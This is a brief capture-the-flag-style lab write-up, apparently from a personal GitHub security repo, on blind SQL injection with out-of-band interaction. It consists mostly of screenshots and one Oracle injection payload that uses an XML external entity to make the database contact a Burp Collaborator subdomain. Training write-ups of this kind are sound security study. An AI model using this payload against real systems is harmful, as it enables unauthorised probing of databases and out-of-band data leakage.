# Lab: Blind SQL injection with out-of-band interaction #

## Lab description ##

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/a3f3db15-3239-477f-ab14-2767a392c8b5)

We have intercepted the request and we will modify the request to trigger outofbond interaction

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/9b4ef090-6abc-40ae-9ed2-f1910cb90cbb)

>  We will use this paylaod `'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`

 ![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/99e9935e-821e-48d2-9361-a0fb515b9824)

> We get some info collaborator tab

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/bb1129c8-95ec-4ac8-9a86-1c43fb6841e8)

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/d97d8ff8-c238-48ff-90c3-2220d8fd538e)
